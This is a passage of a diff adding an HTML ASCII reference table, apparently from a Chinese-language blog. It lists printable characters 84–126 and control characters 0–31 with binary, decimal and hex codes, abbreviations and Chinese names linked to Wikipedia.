+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/84">84</a></td>
+<td align="center">54</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/T">T</a></td>
+</tr>
+<tr>
+<td align="center">0101 0101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/85">85</a></td>
+<td align="center">55</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/U">U</a></td>
+</tr>
+<tr>
+<td align="center">0101 0110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/86">86</a></td>
+<td align="center">56</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/V">V</a></td>
+</tr>
+<tr>
+<td align="center">0101 0111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/87">87</a></td>
+<td align="center">57</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/W">W</a></td>
+</tr>
+<tr>
+<td align="center">0101 1000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/88">88</a></td>
+<td align="center">58</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/X">X</a></td>
+</tr>
+<tr>
+<td align="center">0101 1001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/89">89</a></td>
+<td align="center">59</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Y">Y</a></td>
+</tr>
+<tr>
+<td align="center">0101 1010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/90">90</a></td>
+<td align="center">5A</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Z">Z</a></td>
+</tr>
+<tr>
+<td align="center">0101 1011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/91">91</a></td>
+<td align="center">5B</td>
+<td align="center">[<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%8B%AC%E8%99%9F"></a></td>
+</tr>
+<tr>
+<td align="center">0101 1100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/92">92</a></td>
+<td align="center">5C</td>
+<td align="center">[](<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8F%8D%E6%96%9C%E7%BA%BF">https://zh.wikipedia.org/wiki/反斜线</a>)</td>
+</tr>
+<tr>
+<td align="center">0101 1101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/93">93</a></td>
+<td align="center">5D</td>
+<td align="center">[]](<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%8B%AC%E8%99%9F">https://zh.wikipedia.org/wiki/括號</a>)</td>
+</tr>
+<tr>
+<td align="center">0101 1110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/94">94</a></td>
+<td align="center">5E</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%84%B1%E5%AD%97%E7%AC%A6">^</a></td>
+</tr>
+<tr>
+<td align="center">0101 1111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/95">95</a></td>
+<td align="center">5F</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%BA%95%E7%B7%9A">_</a></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8D%81%E8%BF%9B%E5%88%B6">十进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">十六进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%9B%BE%E5%BD%A2">图形</a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0110 0000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/96">96</a></td>
+<td align="center">60</td>
+<td align="center">[`](<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%87%8D%E9%9F%B3%E7%AC%A6">https://zh.wikipedia.org/wiki/重音符</a>)</td>
+</tr>
+<tr>
+<td align="center">0110 0001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/97">97</a></td>
+<td align="center">61</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/A">a</a></td>
+</tr>
+<tr>
+<td align="center">0110 0010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/98">98</a></td>
+<td align="center">62</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/B">b</a></td>
+</tr>
+<tr>
+<td align="center">0110 0011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/99">99</a></td>
+<td align="center">63</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/C">c</a></td>
+</tr>
+<tr>
+<td align="center">0110 0100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/100">100</a></td>
+<td align="center">64</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/D">d</a></td>
+</tr>
+<tr>
+<td align="center">0110 0101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/101">101</a></td>
+<td align="center">65</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/E">e</a></td>
+</tr>
+<tr>
+<td align="center">0110 0110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/102">102</a></td>
+<td align="center">66</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/F">f</a></td>
+</tr>
+<tr>
+<td align="center">0110 0111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/103">103</a></td>
+<td align="center">67</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/G">g</a></td>
+</tr>
+<tr>
+<td align="center">0110 1000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/104">104</a></td>
+<td align="center">68</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/H">h</a></td>
+</tr>
+<tr>
+<td align="center">0110 1001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/105">105</a></td>
+<td align="center">69</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/I">i</a></td>
+</tr>
+<tr>
+<td align="center">0110 1010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/106">106</a></td>
+<td align="center">6A</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/J">j</a></td>
+</tr>
+<tr>
+<td align="center">0110 1011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/107">107</a></td>
+<td align="center">6B</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/K">k</a></td>
+</tr>
+<tr>
+<td align="center">0110 1100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/108">108</a></td>
+<td align="center">6C</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/L">l</a></td>
+</tr>
+<tr>
+<td align="center">0110 1101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/109">109</a></td>
+<td align="center">6D</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/M">m</a></td>
+</tr>
+<tr>
+<td align="center">0110 1110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/110">110</a></td>
+<td align="center">6E</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/N">n</a></td>
+</tr>
+<tr>
+<td align="center">0110 1111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/111">111</a></td>
+<td align="center">6F</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/O">o</a></td>
+</tr>
+<tr>
+<td align="center">0111 0000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/112">112</a></td>
+<td align="center">70</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/P">p</a></td>
+</tr>
+<tr>
+<td align="center">0111 0001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/113">113</a></td>
+<td align="center">71</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Q">q</a></td>
+</tr>
+<tr>
+<td align="center">0111 0010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/114">114</a></td>
+<td align="center">72</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/R">r</a></td>
+</tr>
+<tr>
+<td align="center">0111 0011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/115">115</a></td>
+<td align="center">73</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/S">s</a></td>
+</tr>
+<tr>
+<td align="center">0111 0100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/116">116</a></td>
+<td align="center">74</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/T">t</a></td>
+</tr>
+<tr>
+<td align="center">0111 0101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/117">117</a></td>
+<td align="center">75</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/U">u</a></td>
+</tr>
+<tr>
+<td align="center">0111 0110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/118">118</a></td>
+<td align="center">76</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/V">v</a></td>
+</tr>
+<tr>
+<td align="center">0111 0111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/119">119</a></td>
+<td align="center">77</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/W">w</a></td>
+</tr>
+<tr>
+<td align="center">0111 1000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/120">120</a></td>
+<td align="center">78</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/X">x</a></td>
+</tr>
+<tr>
+<td align="center">0111 1001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/121">121</a></td>
+<td align="center">79</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Y">y</a></td>
+</tr>
+<tr>
+<td align="center">0111 1010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/122">122</a></td>
+<td align="center">7A</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Z">z</a></td>
+</tr>
+<tr>
+<td align="center">0111 1011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/123">123</a></td>
+<td align="center">7B</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%8B%AC%E8%99%9F">{</a></td>
+</tr>
+<tr>
+<td align="center">0111 1100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/124">124</a></td>
+<td align="center">7C</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%B1%8E%E7%B7%9A">|</a></td>
+</tr>
+<tr>
+<td align="center">0111 1101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/125">125</a></td>
+<td align="center">7D</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%8B%AC%E8%99%9F">}</a></td>
+</tr>
+<tr>
+<td align="center">0111 1110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/126">126</a></td>
+<td align="center">7E</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%B3%A2%E6%B5%AA%E8%99%9F">~</a></td>
+</tr>
+</tbody></table>
+<h3 id="不可见字符"><a href="#不可见字符" class="headerlink" title="不可见字符"></a>不可见字符</h3><table>
+<thead>
+<tr>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E8%BF%9B%E5%88%B6">二进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8D%81%E8%BF%9B%E5%88%B6">十进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6">十六进制</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%BC%A9%E5%86%99">缩写</a></th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Unicode">Unicode</a> 表示法</th>
+<th align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%84%AB%E5%87%BA%E5%AD%97%E5%85%83">脱出字符</a> 表示法</th>
+<th align="center">名称／意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0000 0000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/0">0</a></td>
+<td align="center">00</td>
+<td align="center">NUL</td>
+<td align="center">␀</td>
+<td align="center">^@</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%A9%BA%E5%AD%97%E7%AC%A6">空字符</a>（Null）</td>
+</tr>
+<tr>
+<td align="center">0000 0001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/1">1</a></td>
+<td align="center">01</td>
+<td align="center">SOH</td>
+<td align="center">␁</td>
+<td align="center">^A</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E6%A0%87%E9%A2%98%E5%BC%80%E5%A7%8B&action=edit&redlink=1">标题开始</a></td>
+</tr>
+<tr>
+<td align="center">0000 0010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/2">2</a></td>
+<td align="center">02</td>
+<td align="center">STX</td>
+<td align="center">␂</td>
+<td align="center">^B</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E6%9C%AC%E6%96%87%E5%BC%80%E5%A7%8B&action=edit&redlink=1">本文开始</a></td>
+</tr>
+<tr>
+<td align="center">0000 0011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/3">3</a></td>
+<td align="center">03</td>
+<td align="center">ETX</td>
+<td align="center">␃</td>
+<td align="center">^C</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E6%9C%AC%E6%96%87%E7%BB%93%E6%9D%9F&action=edit&redlink=1">本文结束</a></td>
+</tr>
+<tr>
+<td align="center">0000 0100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/4">4</a></td>
+<td align="center">04</td>
+<td align="center">EOT</td>
+<td align="center">␄</td>
+<td align="center">^D</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E5%82%B3%E8%BC%B8%E7%BB%93%E6%9D%9F&action=edit&redlink=1">传输结束</a></td>
+</tr>
+<tr>
+<td align="center">0000 0101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/5">5</a></td>
+<td align="center">05</td>
+<td align="center">ENQ</td>
+<td align="center">␅</td>
+<td align="center">^E</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E8%AF%B7%E6%B1%82&action=edit&redlink=1">请求</a></td>
+</tr>
+<tr>
+<td align="center">0000 0110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/6">6</a></td>
+<td align="center">06</td>
+<td align="center">ACK</td>
+<td align="center">␆</td>
+<td align="center">^F</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E7%A2%BA%E8%AA%8D%E5%9B%9E%E6%87%89&action=edit&redlink=1">确认回应</a></td>
+</tr>
+<tr>
+<td align="center">0000 0111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/7">7</a></td>
+<td align="center">07</td>
+<td align="center">BEL</td>
+<td align="center">␇</td>
+<td align="center">^G</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E5%93%8D%E9%93%83&action=edit&redlink=1">响铃</a></td>
+</tr>
+<tr>
+<td align="center">0000 1000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/8">8</a></td>
+<td align="center">08</td>
+<td align="center">BS</td>
+<td align="center">␈</td>
+<td align="center">^H</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%80%80%E6%A0%BC%E9%8D%B5">退格</a></td>
+</tr>
+<tr>
+<td align="center">0000 1001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/9">9</a></td>
+<td align="center">09</td>
+<td align="center">HT</td>
+<td align="center">␉</td>
+<td align="center">^I</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%88%B6%E8%A1%A8%E9%94%AE#%E5%AE%9A%E4%BD%8D%E7%AC%A6%E5%8F%B7">水平定位符号</a></td>
+</tr>
+<tr>
+<td align="center">0000 1010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/10">10</a></td>
+<td align="center">0A</td>
+<td align="center">LF</td>
+<td align="center">␊</td>
+<td align="center">^J</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%8F%9B%E8%A1%8C">换行键</a></td>
+</tr>
+<tr>
+<td align="center">0000 1011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/11">11</a></td>
+<td align="center">0B</td>
+<td align="center">VT</td>
+<td align="center">␋</td>
+<td align="center">^K</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E5%9E%82%E7%9B%B4%E5%AE%9A%E4%BD%8D%E7%AC%A6%E8%99%9F&action=edit&redlink=1">垂直定位符号</a></td>
+</tr>
+<tr>
+<td align="center">0000 1100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/12">12</a></td>
+<td align="center">0C</td>
+<td align="center">FF</td>
+<td align="center">␌</td>
+<td align="center">^L</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E6%8D%A2%E9%A1%B5%E9%94%AE&action=edit&redlink=1">换页键</a></td>
+</tr>
+<tr>
+<td align="center">0000 1101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/13">13</a></td>
+<td align="center">0D</td>
+<td align="center">CR</td>
+<td align="center">␍</td>
+<td align="center">^M</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/CR_(%E5%AD%97%E5%85%83)">CR (字符)</a></td>
+</tr>
+<tr>
+<td align="center">0000 1110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/14">14</a></td>
+<td align="center">0E</td>
+<td align="center">SO</td>
+<td align="center">␎</td>
+<td align="center">^N</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%8F%96%E6%B6%88%E8%AE%8A%E6%8D%A2">取消变换</a>（Shift out）</td>
+</tr>
+<tr>
+<td align="center">0000 1111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/15">15</a></td>
+<td align="center">0F</td>
+<td align="center">SI</td>
+<td align="center">␏</td>
+<td align="center">^O</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%90%AF%E7%94%A8%E8%AE%8A%E6%8D%A2">启用变换</a>（Shift in）</td>
+</tr>
+<tr>
+<td align="center">0001 0000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/16">16</a></td>
+<td align="center">10</td>
+<td align="center">DLE</td>
+<td align="center">␐</td>
+<td align="center">^P</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E8%B7%B3%E5%87%BA%E6%95%B0%E6%8D%AE%E9%80%9A%E8%AE%AF&action=edit&redlink=1">跳出数据通讯</a></td>
+</tr>
+<tr>
+<td align="center">0001 0001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/17">17</a></td>
+<td align="center">11</td>
+<td align="center">DC1</td>
+<td align="center">␑</td>
+<td align="center">^Q</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E8%A8%AD%E5%82%99%E6%8E%A7%E5%88%B6&action=edit&redlink=1">设备控制</a>一（<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=XON&action=edit&redlink=1">XON</a> <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E5%95%9F%E7%94%A8%E8%BB%9F%E9%AB%94%E9%80%9F%E5%BA%A6%E6%8E%A7%E5%88%B6&action=edit&redlink=1">激活软件速度控制</a>）</td>
+</tr>
+<tr>
+<td align="center">0001 0010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/18">18</a></td>
+<td align="center">12</td>
+<td align="center">DC2</td>
+<td align="center">␒</td>
+<td align="center">^R</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E8%A8%AD%E5%82%99%E6%8E%A7%E5%88%B6&action=edit&redlink=1">设备控制</a>二</td>
+</tr>
+<tr>
+<td align="center">0001 0011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/19">19</a></td>
+<td align="center">13</td>
+<td align="center">DC3</td>
+<td align="center">␓</td>
+<td align="center">^S</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E8%A8%AD%E5%82%99%E6%8E%A7%E5%88%B6&action=edit&redlink=1">设备控制</a>三（<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=XOFF&action=edit&redlink=1">XOFF</a> <a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E5%81%9C%E7%94%A8%E8%BB%9F%E9%AB%94%E9%80%9F%E5%BA%A6%E6%8E%A7%E5%88%B6&action=edit&redlink=1">停用软件速度控制</a>）</td>
+</tr>
+<tr>
+<td align="center">0001 0100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/20">20</a></td>
+<td align="center">14</td>
+<td align="center">DC4</td>
+<td align="center">␔</td>
+<td align="center">^T</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E8%A8%AD%E5%82%99%E6%8E%A7%E5%88%B6&action=edit&redlink=1">设备控制</a>四</td>
+</tr>
+<tr>
+<td align="center">0001 0101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/21">21</a></td>
+<td align="center">15</td>
+<td align="center">NAK</td>
+<td align="center">␕</td>
+<td align="center">^U</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%A2%BA%E8%AA%8D%E5%A4%B1%E6%95%97%E5%9B%9E%E6%87%89">确认失败回应</a></td>
+</tr>
+<tr>
+<td align="center">0001 0110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/22">22</a></td>
+<td align="center">16</td>
+<td align="center">SYN</td>
+<td align="center">␖</td>
+<td align="center">^V</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E5%90%8C%E6%AD%A5%E7%94%A8%E6%9A%AB%E5%81%9C&action=edit&redlink=1">同步用暂停</a></td>
+</tr>
+<tr>
+<td align="center">0001 0111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/23">23</a></td>
+<td align="center">17</td>
+<td align="center">ETB</td>
+<td align="center">␗</td>
+<td align="center">^W</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%80%E5%A1%8A%E5%82%B3%E8%BC%B8%E7%BB%93%E6%9D%9F&action=edit&redlink=1">区块传输结束</a></td>
+</tr>
+<tr>
+<td align="center">0001 1000</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/24">24</a></td>
+<td align="center">18</td>
+<td align="center">CAN</td>
+<td align="center">␘</td>
+<td align="center">^X</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E5%8F%96%E6%B6%88&action=edit&redlink=1">取消</a></td>
+</tr>
+<tr>
+<td align="center">0001 1001</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/25">25</a></td>
+<td align="center">19</td>
+<td align="center">EM</td>
+<td align="center">␙</td>
+<td align="center">^Y</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E9%80%A3%E7%B7%9A%E4%BB%8B%E8%B4%A8%E4%B8%AD%E6%96%AD&action=edit&redlink=1">连线介质中断</a></td>
+</tr>
+<tr>
+<td align="center">0001 1010</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/26">26</a></td>
+<td align="center">1A</td>
+<td align="center">SUB</td>
+<td align="center">␚</td>
+<td align="center">^Z</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%9B%BF%E4%BB%A3%E5%AD%97%E7%AC%A6">替换</a></td>
+</tr>
+<tr>
+<td align="center">0001 1011</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/27">27</a></td>
+<td align="center">1B</td>
+<td align="center">ESC</td>
+<td align="center">␛</td>
+<td align="center">^[</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%80%80%E5%87%BA%E9%94%AE">退出键</a></td>
+</tr>
+<tr>
+<td align="center">0001 1100</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/28">28</a></td>
+<td align="center">1C</td>
+<td align="center">FS</td>
+<td align="center">␜</td>
+<td align="center">^\</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E6%96%87%E4%BB%B6%E5%88%86%E5%89%B2%E7%AC%A6&action=edit&redlink=1">文件分割符</a></td>
+</tr>
+<tr>
+<td align="center">0001 1101</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/29">29</a></td>
+<td align="center">1D</td>
+<td align="center">GS</td>
+<td align="center">␝</td>
+<td align="center">^]</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E7%BE%A4%E7%B5%84%E5%88%86%E9%9A%94%E7%AC%A6&action=edit&redlink=1">组群分隔符</a></td>
+</tr>
+<tr>
+<td align="center">0001 1110</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/30">30</a></td>
+<td align="center">1E</td>
+<td align="center">RS</td>
+<td align="center">␞</td>
+<td align="center">^^</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E8%AE%B0%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6&action=edit&redlink=1">记录分隔符</a></td>
+</tr>
+<tr>
+<td align="center">0001 1111</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/31">31</a></td>
+<td align="center">1F</td>
+<td align="center">US</td>
+<td align="center">␟</td>
+<td align="center">^_</td>
+<td align="center"><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E5%8D%95%E5%85%83%E5%88%86%E9%9A%94%E7%AC%A6&action=edit&redlink=1">单元分隔符</a></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+<td align="center"></td>
+</tr>
+<tr>
+<td align="center">0111 1111</td>
